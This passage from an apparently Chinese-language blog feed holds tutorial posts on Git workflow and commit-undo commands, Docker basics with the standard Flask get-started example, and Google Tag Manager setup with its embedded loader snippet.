Flow模型中定义了主分支和辅助分支两类分支。其中主分支用于组织与软件开发，部署相关的活动；辅助分支为了解决特定的问题而进行的各种开发活动。<a href="https://blog.csdn.net/Eacter/article/details/78552607" target="_blank" rel="noopener">具体查看</a></p><ul><li>主分支：master / develop</li><li>辅助分支： feature / release / hotfix<br><img src="/2018/09/13/Git笔记/1.png" style="padding-top:20px"></li></ul><h4 id="3-4-变基与合并"><a href="#3-4-变基与合并" class="headerlink" title="3.4 变基与合并"></a>3.4 变基与合并</h4><ul><li>合并(Merge): 它会把两个分支的最新快照(C3 和 C4)以及两者的共同祖先(C2)进行三方合并，合并的结果是生成一个新的快照(并提交)。<br><img src="/2018/09/13/Git笔记/2.png" style="padding-top:20px"></li></ul><p><br></p><ul><li>变基(Rebase): 提取在C4中引入的补丁和修改，然后再C3的基础上应用一次。<br><strong>变基的风险</strong>: 变基操作的实质是丢弃一些现有的提交，然后相应地新建一些内容一样但实际上不同的提交。如果你已经将提交推送至某个仓库，而其他人也已经从该仓库拉取提交并进行了后续工作，此时，你用 git rebase 命令重新整理了提交并再次推送，你的同伴因此将不得不再次将他们手头的工作与你的提交进行整合，如果接下来你还要拉取并整合他们修改过的提交，事情就会变得一团糟。总的原则是，不要对在你的仓库外有副本的分支执行变基。<br><img src="/2018/09/13/Git笔记/3.png" style="padding-top:20px"></li></ul><p><br></p><h3 id="4-其他"><a href="#4-其他" class="headerlink" title="4. 其他"></a>4. 其他</h3><h4 id="4-1-生成SSH公钥"><a href="#4-1-生成SSH公钥" class="headerlink" title="4.1 生成SSH公钥"></a>4.1 生成SSH公钥</h4><p>默认情况下，用户的SSH密钥存储在其 ~/.ssh 目录下。我们需要寻找一对以id_dsa或id_ras命名的文件，其中一个带有.pub扩展名，.pub文件是你的公钥，另一个则是私钥。</p><p>如果找不到这样的文件，你可以运行ssh-keygen程序来创建它们。ssh-keygen会确认密钥的存储位置，然后它会要求你输入两次密钥口令。如果你不想在使用密钥时输入口令，将其留空即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/.ssh</span><br><span class="line">$ ls</span><br><span class="line">authorized_keys2  id_dsa       known_hosts</span><br><span class="line">config            id_dsa.pub</span><br><span class="line">$ ssh-keygen</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-2-暂存文件"><a href="#4-2-暂存文件" class="headerlink" title="4.2 暂存文件"></a>4.2 暂存文件</h4><p>将当前工作区的修改暂存起来，stash后，可以将其重新应用到当前工作区。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git stash</span><br><span class="line">$ git stash apply</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-3-撤销错误commit"><a href="#4-3-撤销错误commit" class="headerlink" title="4.3 撤销错误commit"></a>4.3 撤销错误commit</h4><ul><li><p>错误commit后，仅撤销commit, 暂存区、工作内容不变<br><em>注意: commit-id为错误commit之前的commit-id</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --soft commit-id</span><br></pre></td></tr></table></figure></li><li><p>错误commit后，撤销commit和add， 工作内容不变</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --mixed commit-id</span><br><span class="line">// 该命令相当于恢复到git add 之前的状态，同时工作区的内容不变</span><br></pre></td></tr></table></figure></li><li><p>错误commit后，想恢复到某个版本库的代码（暂存区、工作区均改变）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git log</span><br><span class="line">$ git reset --hard commit-id</span><br></pre></td></tr></table></figure></li><li><p>撤销已经push至远端仓库的commit<br>撤回后直接push, 会报错。 因为本地项目版本号低于远端仓库版本号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">error: failed to push some refs to &apos;https://github.com/ufresh2013/elite-wagtail.git&apos;</span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind</span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.</span><br><span class="line">hint: &apos;git pull ...&apos;) before pushing again.</span><br></pre></td></tr></table></figure></li></ul><p>这时，可以添加参数<code>force</code>强制提交， 达到撤销远端版本号的目的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">git reset --mixed commit-id</span><br><span class="line">git push origin master --force // 强制提交当前版本号，撤销远端错误commit</span><br><span class="line"></span><br><span class="line">// 重新提交</span><br><span class="line">git add</span><br><span class="line">git commit</span><br><span class="line">git push</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-4-合并commit"><a href="#4-4-合并commit" class="headerlink" title="4.4 合并commit"></a>4.4 合并commit</h4><p>通过变基，可以将一连串提交压缩成一个单独的提交。<br>假设已经存在3个commit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line">commit commitId3   add line 3</span><br><span class="line">commit commitId2   add line 2</span><br><span class="line">commit commitId1   add line 1</span><br></pre></td></tr></table></figure></p><p>现在我们需要把add line 2, add line 3这两个commit合并成一个commit。pick会执行这个commit, squash会把这个commit合并到前一个commit。<code>wq</code>保存后，会继续跳到commit message。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i commitId1</span><br><span class="line"></span><br><span class="line">pick commitId2 add line 2</span><br><span class="line">squash commitId3 add line 3</span><br><span class="line">#</span><br><span class="line"># Commands:</span><br><span class="line">#  p, pick = use commit</span><br><span class="line">#  r, reword = use commit, but edit the commit message</span><br><span class="line">#  e, edit = use commit, but stop for amending</span><br><span class="line">#  s, squash = use commit, but meld into previous commit</span><br><span class="line">#  f, fixup = like &quot;squash&quot;, but discard this commit&apos;s log message</span><br><span class="line">#  x, exec = run command (the rest of the line) using shell</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-5-拆分commit"><a href="#4-5-拆分commit" class="headerlink" title="4.5 拆分commit"></a>4.5 拆分commit</h4><p>拆分一个提交会撤销这个提交，然后多次地部分第暂存与提交知道完成你所需次数的提交。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset HEAD^</span><br><span class="line">实际上将会撤销那次提交并将修改的文件未暂存</span><br></pre></td></tr></table></figure></p><ul><li>从每一个提交移除一个文件: 有人粗心地通过<code>git add .</code> 提交了一个巨大的二进制文件，你想要从所有地方删除它。可能偶然提交了一个包含密码的文件，然而你想开源项目。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git filter-branch --tree-filter &apos;rm -f passwords.txt&apos; HEAD</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="4-6-Git钩子"><a href="#4-6-Git钩子" class="headerlink" title="4.6 Git钩子"></a>4.6 Git钩子</h4><p>Git 能在特定的重要动作发生时触发自定义脚本。客户端钩子由诸如提交和合并这样的操作所调用，而服务器端钩子作用于诸如接收被推送的提交这样的联网操作。<br><br></p><h4 id="4-7-Github-Pages"><a href="#4-7-Github-Pages" class="headerlink" title="4.7 Github Pages"></a>4.7 Github Pages</h4><ul><li>Create a repository.</li><li>Go to the folder where you want to store your project, and clone the new repository<br><code>git clone https://github.com/username/username.github.io</code></li><li>Enter the project folder and add an index.html file<br><code>echo &quot;hello world&quot; &gt; index.html</code></li><li>Add, commit, and push your changes</li><li>Fire up a broswer and go to <a href="http://username.github.io" target="_blank" rel="noopener">http://username.github.io</a></li></ul><p><br><br><br></p><h3 id="5-Commitizen规范提交信息"><a href="#5-Commitizen规范提交信息" class="headerlink" title="5. Commitizen规范提交信息"></a>5. Commitizen规范提交信息</h3><p>commitizen是AngularJS项目中用到的Git Commit Guidelines。用来规范commit信息，遵循一定的范式，便于日后追踪问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 全局安装commitizen</span><br><span class="line">npm install -g commitizen</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 在项目目录里，运行下面命令，使其支持angular的commite message格式</span><br><span class="line">commitizen init cz-conventional-changelog --save --save-exact</span><br></pre></td></tr></table></figure><p>凡是用到git commit命令，一律改为使用git cz，就会出现选项，用来生成符合格式的commit message</p><p><img src="/2018/09/13/Git笔记/4.png" style="max-width: 500px"></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">Git官方文档</a></li><li><a href="https://blog.csdn.net/Eacter/article/details/78552607" target="_blank" rel="noopener">Git工作流程最佳实践–git flow</a></li><li><a href="https://blog.csdn.net/hanchao5272/article/details/79435730" target="_blank" rel="noopener">Git撤销已经推送(push)至远端仓库的提交(commit)信息</a></li><li><a href="https://www.jianshu.com/p/201bd81e7dc9?utm_source=oschina-app" target="_blank" rel="noopener">git commit 规范指南</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Docker基本概念与操作</title>
      <link href="/2018/09/08/Docker%E5%85%A5%E9%97%A8/"/>
      <url>/2018/09/08/Docker%E5%85%A5%E9%97%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-Docker是什么？"><a href="#1-Docker是什么？" class="headerlink" title="1. Docker是什么？"></a>1. Docker是什么？</h3><p>Docker是一个虚拟环境容器，可以将你的开发环境、代码、配置文件等一并打包到这个容器中，并发布和应用到任意平台中。比如，你在本地用Python开发网站后台，开发测试完成后，就可以将Python3及其依赖包、Flask及其各种插件、Mysql、Nginx等打包到一个容器中，然后部署到任意你想部署到的环境。</p><p>Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly.</p><p><br></p><h3 id="2-Docker-Engine"><a href="#2-Docker-Engine" class="headerlink" title="2. Docker Engine"></a>2. Docker Engine</h3><p>最核心的是Docker Daemon，称之为Docker守护进程，也就是server端。Sever端与客户端通过REST API 进行通信。客户端提供一个只读的镜像，通过镜像可以创建一个或多个容器，容器在docker client中只是一个进程，两个进程是互不可见的。</p><p>The Cli uses the Docker REST API to control or interact with the Docker daemon through scripting or direct CLI commands. The daemon creates and manages Docker objects, such as images, container, networks and wolumes.<br><img src="/2018/09/08/Docker入门/1.jpeg" style="padding-top:20px; max-width: 380px"></p><p><br></p><h3 id="3-Docker架构与基本概念"><a href="#3-Docker架构与基本概念" class="headerlink" title="3. Docker架构与基本概念"></a>3. Docker架构与基本概念</h3><p>镜像是Docker生命周期中的构建或打包阶段，而容器则是启动或执行阶段。</p><p>A container is launched by running an image. An image is an executable package that includes everything needed to run an application – the code, a runtime, libraries, environment variables, and configuration files.<br><img src="/2018/09/08/Docker入门/2.jpeg" style="padding-top:20px"></p><p><br></p><h4 id="3-1-镜像-Docker-Image"><a href="#3-1-镜像-Docker-Image" class="headerlink" title="3.1 镜像(Docker Image)"></a>3.1 镜像(Docker Image)</h4><p>An image is a read-only template with instructions for creating a Docker container.</p><p>镜像是一种层式结构。由一系列指令一步步构建出来：执行一条命令，添加文件或文件夹，创建环境变量，容器启动时-运行什么环境。<br>当用户修改一个Docker Image的时候（比如更新应用程序）一个新的层就会被建立。因此，这是一种增量式的修改，而不是新建一个全新的Image，这也是区别于传统虚拟机的一点。当你发布一个新的Image时，你只需要发布差异的部分，因此速度就非常快。<br><img src="/2018/09/08/Docker入门/3.jpeg" style="padding-top:20px; max-width:300px"></p><p><br></p><h4 id="3-2-容器（Container）"><a href="#3-2-容器（Container）" class="headerlink" title="3.2 容器（Container）"></a>3.2 容器（Container）</h4><p>A container is a runnable instance of an image.</p><p>Docker在文件系统内部用这个镜像创建了一个新容器。该容器拥有自己的网络、IP地址，以及一个用来和宿主机进行通信的桥接网络接口。</p><p>打个比方，你首先下载了一个Ubuntu的镜像，然后又安装了mysql和Django应用及依赖，来完成对Ubutun镜像的修改，生成了一个应用镜像。然后，你把这个镜像分享给大家使用，大家通过这个镜像生成了一个容器，容器启动后就会运行Django服务。</p><p><br></p><h4 id="3-3-仓库（Docker-Repository）"><a href="#3-3-仓库（Docker-Repository）" class="headerlink" title="3.3 仓库（Docker Repository）"></a>3.3 仓库（Docker Repository）</h4><p>Docker用来存放镜像的。共有仓库docker hub提供了非常多的镜像文件，这些镜像直接拉取下来就可以运行了，你也可以上传自己的镜像到docker hub上，搭建私有仓库。</p><ul><li>开发构建镜像并将镜像push到docker仓库</li><li>测试或者运维从docker仓库拷贝一份镜像到本地</li><li>通过镜像文件开启docker容器并提供服务<br><img src="/2018/09/08/Docker入门/4.jpeg" style="padding-top:20px"></li></ul><p><br></p><h3 id="4-怎么用Docker完成持续集成、自动交付、自动部署？"><a href="#4-怎么用Docker完成持续集成、自动交付、自动部署？" class="headerlink" title="4. 怎么用Docker完成持续集成、自动交付、自动部署？"></a>4. 怎么用Docker完成持续集成、自动交付、自动部署？</h3><p>搭建一个完整的自动化流程还需要github+Jenkins+registry三样帮助。</p><ul><li>开发人员推送代码到git，git服务器通过hook通知jenkis</li><li>jenkins克隆git代码到本地，并通过dockerFile文件进行编译</li><li>打包生成一个新版本的镜像并推送到仓库，删除当前容器，通过新版本镜像重新运行。<br>开发只需git add *, git commit -m “”, git push即可完成持续集成、自动交付、自动部署。<br><img src="/2018/09/08/Docker入门/5.jpeg" style="padding-top:20px"></li></ul><p><br></p><h3 id="5-Docker基本命令"><a href="#5-Docker基本命令" class="headerlink" title="5. Docker基本命令"></a>5. Docker基本命令</h3><table><thead><tr><th>镜像的操作</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>$ docker search centos</td><td style="text-align:center">查看镜像是否存在</td></tr><tr><td>$ docker pull centos</td><td style="text-align:center">获取镜像</td></tr><tr><td>$ docker build</td><td style="text-align:center">创建镜像（利用Dockerfile）</td></tr><tr><td>$ docker images ls</td><td style="text-align:center">查看镜像</td></tr><tr><td>$ docker commit</td><td style="text-align:center">将容器转化为一个镜像</td></tr><tr><td>$ docker rmi image_name/image_id</td><td style="text-align:center">删除镜像</td></tr><tr><td>容器的操作</td><td style="text-align:center"></td></tr><tr><td>$ docker run</td><td style="text-align:center">基于镜像启动容器</td></tr><tr><td>$ docker container ls</td><td style="text-align:center">查看容器</td></tr><tr><td>$ docker start container_name/container_id</td><td style="text-align:center">启动容器</td></tr><tr><td>$ docker stop container_name/container_id</td><td style="text-align:center">停止容器</td></tr><tr><td>$ docker restart container_name/container_id</td><td style="text-align:center">重启容器</td></tr><tr><td>$ docker rm container_name/container_id</td><td style="text-align:center">删除容器</td></tr><tr><td>$ docker exec -it container-id /bin/bash</td><td style="text-align:center">进入容器</td></tr><tr><td>仓库的操作</td><td style="text-align:center"></td></tr><tr><td>$ docker login</td><td style="text-align:center">登录Dockerhub</td></tr><tr><td>$ docker push xianhu/centos:git</td><td style="text-align:center">将本地的镜像推送到Dockerhub</td></tr><tr><td>$ docker pull xianhu/centos:git</td><td style="text-align:center">从你的仓库中下载镜像</td></tr></tbody></table><p><br></p><h3 id="6-操作示例"><a href="#6-操作示例" class="headerlink" title="6. 操作示例"></a>6. 操作示例</h3><p><a href="https://docs.docker.com/get-started" target="_blank" rel="noopener">https://docs.docker.com/get-started</a></p><h4 id="5-1-Orientation-Set-up-your-Docker-environment"><a href="#5-1-Orientation-Set-up-your-Docker-environment" class="headerlink" title="5.1 Orientation (Set up your Docker environment)"></a>5.1 Orientation (Set up your Docker environment)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Display docker version and info</span><br><span class="line">docker –version</span><br><span class="line">docker info</span><br><span class="line"></span><br><span class="line"># Execute Docker image</span><br><span class="line">docker run hello-world</span><br><span class="line"></span><br><span class="line"># list Docker images</span><br><span class="line">docker image ls</span><br><span class="line"></span><br><span class="line"># list Docker containers </span><br><span class="line">docker container ls</span><br></pre></td></tr></table></figure><h4 id="5-2-Containers-Build-an-image-and-run-it-as-one-container"><a href="#5-2-Containers-Build-an-image-and-run-it-as-one-container" class="headerlink" title="5.2  Containers(Build an image and run it as one container)"></a>5.2  Containers(Build an image and run it as one container)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"># Create an empty directory. Cd into the new directory, create a file call Dockerfile.</span><br><span class="line">mkdir docker-test</span><br><span class="line">cd docker-test</span><br><span class="line">touch Dockerfile</span><br><span class="line">vim Dockerfile</span><br><span class="line"></span><br><span class="line"># copy-and-paste the follow content into the Dockerfile</span><br><span class="line">  # Use an official Python runtime as a parent image</span><br><span class="line">  FROM python:2.7-slim</span><br><span class="line"></span><br><span class="line">  # Set the working directory to /app</span><br><span class="line">  WORKDIR /app</span><br><span class="line"></span><br><span class="line">  # Copy the current directory contents into the container at /app</span><br><span class="line">  ADD . /app</span><br><span class="line"></span><br><span class="line">  # Install any needed packages specified in requirements.txt</span><br><span class="line">  RUN pip install --trusted-host pypi.python.org -r requirements.txt</span><br><span class="line"></span><br><span class="line">  # Make port 80 available to the world outside this container</span><br><span class="line">  EXPOSE 80</span><br><span class="line"></span><br><span class="line">  # Define environment variable</span><br><span class="line">  ENV NAME World</span><br><span class="line"></span><br><span class="line">  # Run app.py when the container launches</span><br><span class="line">  CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># create two more files, requirements.txt and app.py.</span><br><span class="line">requirements.txt</span><br><span class="line">  Flask</span><br><span class="line">  Redis</span><br><span class="line"></span><br><span class="line">app.py</span><br><span class="line">  from flask import Flask</span><br><span class="line">  from redis import Redis, RedisError</span><br><span class="line">  import os</span><br><span class="line">  import socket</span><br><span class="line"></span><br><span class="line">  # Connect to Redis</span><br><span class="line">  redis = Redis(host=&quot;redis&quot;, db=0, socket_connect_timeout=2, socket_timeout=2)</span><br><span class="line"></span><br><span class="line">  app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">  @app.route(&quot;/&quot;)</span><br><span class="line">  def hello():</span><br><span class="line">      try:</span><br><span class="line">          visits = redis.incr(&quot;counter&quot;)</span><br><span class="line">      except RedisError:</span><br><span class="line">          visits = &quot;&lt;i&gt;cannot connect to Redis, counter disabled&lt;/i&gt;&quot;</span><br><span class="line"></span><br><span class="line">      html = &quot;&lt;h3&gt;Hello &#123;name&#125;!&lt;/h3&gt;&quot; \</span><br><span class="line">              &quot;&lt;b&gt;Hostname:&lt;/b&gt; &#123;hostname&#125;&lt;br/&gt;&quot; \</span><br><span class="line">              &quot;&lt;b&gt;Visits:&lt;/b&gt; &#123;visits&#125;&quot;</span><br><span class="line">      return html.format(name=os.getenv(&quot;NAME&quot;, &quot;world&quot;), hostname=socket.gethostname(), visits=visits)</span><br><span class="line"></span><br><span class="line">  if __name__ == &quot;__main__&quot;:</span><br><span class="line">      app.run(host=&apos;0.0.0.0&apos;, port=80)</span><br></pre></td></tr></table></figure><h4 id="5-3-Build-and-run-the-app"><a href="#5-3-Build-and-run-the-app" class="headerlink" title="5.3 Build and run the app"></a>5.3 Build and run the app</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Creates a Docker image</span><br><span class="line">docker build -t friendlyhello .</span><br><span class="line">docker image ls</span><br><span class="line"></span><br><span class="line"># Run the app</span><br><span class="line">docker run -p 4000:80 friendlyhello</span><br><span class="line"></span><br><span class="line"># Run the app in the background, in detached mode:</span><br><span class="line">$ docker run -d -p 4000:80 friendlyhello</span><br><span class="line"></span><br><span class="line">Stop the process with the container id</span><br><span class="line">$ docker container stop 1fa4ab2cf395</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># visit the URL </span><br><span class="line">http://localhost:4000</span><br></pre></td></tr></table></figure><h4 id="5-4-Share-your-image"><a href="#5-4-Share-your-image" class="headerlink" title="5.4 Share your image"></a>5.4 Share your image</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Share your image</span><br><span class="line"># login in with your docker ID</span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line"># Tag the image</span><br><span class="line">docker tag image username/repository:tag</span><br><span class="line">docker tag friendlyhello ufresh/get-started:part2</span><br><span class="line"></span><br><span class="line"># Publish the image</span><br><span class="line">docker push username/repository:tag</span><br><span class="line"></span><br><span class="line"># Pull and run the image from the remote repository</span><br><span class="line">docker run -p 4000:80 username/repository:tag</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Google-tag-manager设置</title>
      <link href="/2018/08/16/google-tag-manager/"/>
      <url>/2018/08/16/google-tag-manager/</url>
      <content type="html"><![CDATA[<h3 id="1-登录"><a href="#1-登录" class="headerlink" title="1. 登录"></a>1. 登录</h3><p>进入<a href="https://marketingplatform.google.com/about/tag-manager/" target="_blank" rel="noopener">Google tag官网</a><br><br></p><h3 id="2-新建容器"><a href="#2-新建容器" class="headerlink" title="2. 新建容器"></a>2. 新建容器</h3><p>一个账号可拥有多个容器，一个容器放一个广告，页面左上角可切换容器。</p><ul><li>进入跟踪代码 管理tab</li><li>点击右上角 + 创建容器</li><li>设置容器名称和容器使用位置<br><br></li></ul><h3 id="3-新建代码"><a href="#3-新建代码" class="headerlink" title="3. 新建代码"></a>3. 新建代码</h3><p>页面添加<code>&lt;div id=&quot;vip&quot;&gt;&lt;/div&gt;</code>，代码类型选择<em>自定义HTML</em>，通过js设置#vip的innerHTML<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">.my-theme-vip&#123;</span><br><span class="line">  height: 60px;</span><br><span class="line">  line-height: 60px;</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  background: #e2f1ff;</span><br><span class="line">  color: #4788C7;</span><br><span class="line">  padding: 0 25px;</span><br><span class="line">  position: relative;</span><br><span class="line">&#125;</span><br><span class="line">.my-theme-vip a&#123;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  width: auto;</span><br><span class="line">  padding: 0 20px;</span><br><span class="line">  font-size: 14px;</span><br><span class="line">  letter-spacing: 0.3px;</span><br><span class="line">  height: 38px;</span><br><span class="line">  line-height: 38px;</span><br><span class="line">  border-radius: 3px;</span><br><span class="line">  cursor: pointer;</span><br><span class="line">  background: #fff;</span><br><span class="line">  color: #4788C7;</span><br><span class="line">  border: 1px solid $blue;</span><br><span class="line">  position: absolute;</span><br><span class="line">  right: 25px;</span><br><span class="line">  top: 11px;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">&#125;</span><br><span class="line">.my-theme-vip a:hover&#123;</span><br><span class="line">  background: #f7fbfe;</span><br><span class="line">  color: #4788C7;</span><br><span class="line">  text-decoration: none;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&apos;vip&apos;).innerHTML= &apos;&lt;div class=&quot;my-theme-vip&quot;&gt;一个学分的价格， 学习完整的MBA课程&lt;a class=&quot;my-theme-vip-enter&quot; href=&quot;/vip/card&quot;&gt;加入会员&lt;/a&gt;&lt;/div&gt;&apos;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><ul><li>设置触发器: All Pages 网页浏览<br><br></li></ul><h3 id="4-提交发布"><a href="#4-提交发布" class="headerlink" title="4. 提交发布"></a>4. 提交发布</h3><ul><li><p>安装Google跟踪管理器: 将代码复制到你的网站上。<br>关闭调试url上添加<code>&amp;gtm_debug=</code><br>修改<code>f=document.getElmentById(&#39;vip&#39;)</code>,<code>f.appendChild(j,f)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;vip&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;!-- Google Tag Manager --&gt;</span><br><span class="line">&lt;script&gt;(function(w,d,s,l,i)&#123;w[l]=w[l]||[];w[l].push(&#123;&apos;gtm.start&apos;:</span><br><span class="line">new Date().getTime(),event:&apos;gtm.js&apos;&#125;);var f=d.getElementById(&apos;vip&apos;),</span><br><span class="line">j=d.createElement(s),dl=l!=&apos;dataLayer&apos;?&apos;&amp;l=&apos;+l:&apos;&apos;;j.async=true;j.src=</span><br><span class="line">&apos;https://www.googletagmanager.com/gtm.js?id=&apos;+i+dl+&apos;&amp;gtm_debug=&apos;;f.appendChild(j,f);</span><br><span class="line">&#125;)(window,document,&apos;script&apos;,&apos;dataLayer&apos;,&apos;GTM-TGWQQRB&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>提交: 填写版本名称，版本说明</p></li><li>预览</li><li>发布<div id="vip"></div><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementById('vip'),j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl+'&gtm_debug=';f.appendChild(j,f);})(window,document,'script','dataLayer','GTM-TGWQQRB');</script><!-- End Google Tag Manager --><br></li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a 